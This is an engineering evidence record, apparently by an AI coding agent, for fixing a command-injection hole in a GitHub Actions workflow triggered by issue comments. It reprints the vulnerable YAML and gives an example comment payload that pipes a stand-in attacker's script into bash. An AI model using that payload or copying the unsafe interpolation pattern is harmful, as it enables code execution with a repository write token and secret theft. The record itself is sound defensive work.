# EVIDENCE — `security-gemini-agent-genesis-injection-01`

**Workstream:** gate-hygiene · workflow trigger hardening
**Owner:** OpenHands (Weaver pass)
**BASE_MAIN:** `357fbd83001924e909979fbaebdedbd991a2aadb`
**Branch:** `security/harden-gemini-agent-genesis-workflow-01`
**Status:** IMPLEMENTED — awaiting human authority

## Objective

Remove a command-injection vector in `.github/workflows/gemini-agent-genesis.yml` that
let any commenter execute arbitrary commands with a repository write token, and repair the
step's broken invocation and direct-to-`main` push.

## Defect (reproduced)

The job triggers on `issue_comment` (`if: contains(github.event.comment.body, '/weaver')`)
and, at its pre-fix revision, interpolated the comment body directly into a `run:` script:

```yaml
permissions:
  contents: write
...
  run: |
    TASK_INPUT="${{ github.event.comment.body || github.event.inputs.task }}"
    ...
    python3 weaver.py "$CLEAN_TASK" --recursive --enabled
...
- name: Push Evolution to Main
  run: |
    git add .
    git commit -m "arkadia: recursive evolution cycle complete"
    git push origin main
```

GitHub substitutes `${{ }}` **before** the shell parses the script, so a comment body of
`/weaver"; curl attacker.sh | bash; echo "` is executed as a command — inside a job holding
`contents: write`. This is the class ADR-013 §1 closed for the runtime shell tool, left open
at the CI boundary.

Three further facts at the same revision:

1. `python3 weaver.py` names a file that is **not in this repository** — `git log --all -- weaver.py`
   shows only `9ab26fc` / `377cdb3`, the latter being "fix stale URLs, **archive legacy Python**".
   The step therefore always failed, which is the observed CI annotation.
2. The trailing step commits and pushes **directly to `main`**, violating the repository's
   never-push-to-main rule.
3. `GEMINI_API_KEY` is exposed to the injected process.

### Observed CI failure

Check `weaver_evolution`, run `37164268026` / job `111323865208` (started 2026-10-04T00:13:16Z),
annotation `[failure] .github:57 :: Process completed with exit code 126` — bash exit 126,
"command found but not executable", i.e. `python3 weaver.py` with `weaver.py` absent.

The triggering comment is real and benign, which is why this reads as a plain CI failure:
comment `5974892742` on PR #250, authored by `Arkadia-Oversoul-Prism` at `2026-10-04T00:13:11Z`,
body beginning `ARKADIA ENGINEERING\nGATE-HYGIENE · PASS 1\n...`. The workflow interpolated
that entire multi-line engineering glance into the `run:` script.

## Change

| File | Change |
| --- | --- |
| `.github/workflows/gemini-agent-genesis.yml` | `contents: write` → `read`; untrusted body passed via `env: WEAVER_TASK_INPUT` and quoted, never interpolated into `run:`; `weaver.py` → `python3 -m weaver.workbench recon`; `Push Evolution to Main` step deleted |
| `tests/test_workflow_injection_boundary.py` | New regression boundary (22 tests) |
| `docs/control-plane/evidence/security-gemini-agent-genesis-injection-01/EVIDENCE.md` | This record |

The replacement entrypoint is the canonical governed one and was smoke-tested:

```
$ PYTHONPATH=. python3 -m weaver.workbench recon --objective "hardening smoke test"
{"ok": true, "state": "RECONSTRUCTED", ... "next_action_hint": "awaiting human authorization",
 "authorization_note": "CONTEXT != AUTHORIZATION. This packet never grants a PassSpec."}
```

It is read-only by default, cannot originate authority, and its state machine stops at
`awaiting human authorization` — the correct posture for a comment-triggered job.

## Verification

```
tests/test_workflow_injection_boundary.py ............  22 passed
tests/architecture + tests/test_m02a_ci_gate_integrity.py  66 passed
```

Negative control: `test_detector_flags_the_vulnerable_form` feeds the detector the pre-fix
line and asserts it is reported; `test_detector_accepts_the_env_passthrough_form` asserts the
repaired form passes. The detector cannot be disarmed by a rewrite of the workflow without
also failing the negative control.

The boundary test is parametrized over **every** `.github/workflows/*.yml`, so a new
workflow that interpolates `github.event.{comment,issue,pull_request,review,discussion}.{body,title}`
into a `run:` block fails CI rather than shipping.

### Baseline comparison

Full suite, `--continue-on-collection-errors`, this environment:

| Revision | Result | Failure node-set sha256 |
| --- | --- | --- |
| `main` @ `357fbd83` | 23F / 1368P / 19S / 1E | `762a38ae2f38b0025395e547a8627ce8e99f7d2599dfe0fe5c30b518e5b092ee` |
| this branch | 23F / 1390P / 19S / 1E | `762a38ae2f38b0025395e547a8627ce8e99f7d2599dfe0fe5c30b518e5b092ee` |

The failure node-set is **byte-identical** — zero regression. The `+22 passed` is exactly the
new boundary test file.

Recorded in `AGENTS.md` / `.bootstrap` for this SHA is `5745314330ce11df9ee8c06986c506ac71a5883e4c2ff1f0a4902400e971bef6`
(29 nodes); 24 nodes are measured here. That 5-node gap is pre-existing and independent of
this work — it is recorded, not silently absorbed, and is not repaired here.

## Remaining uncertainty

- The 5-node baseline discrepancy above is unreconciled and untouched by this PR.
- `weaver.workbench recon` is smoke-tested locally; the workflow has not been dispatched,
  because dispatching would run untrusted-trigger machinery. Post-merge behaviour on a real
  `/weaver` comment is unobserved. Classify as IMPLEMENTED, not VERIFIED.
- `GEMINI_API_KEY` is still exposed to a job that processes untrusted text. Dropping it is
  possible but changes behaviour beyond the injection fix; recorded as a separate proposal.

## Authority boundary

No merge. No push to `main`. Human sovereign retains merge authority. The `git push origin main`
step is removed by this change, so the workflow cannot self-merge after this lands — but that
is a repository-source claim, not a production observation.
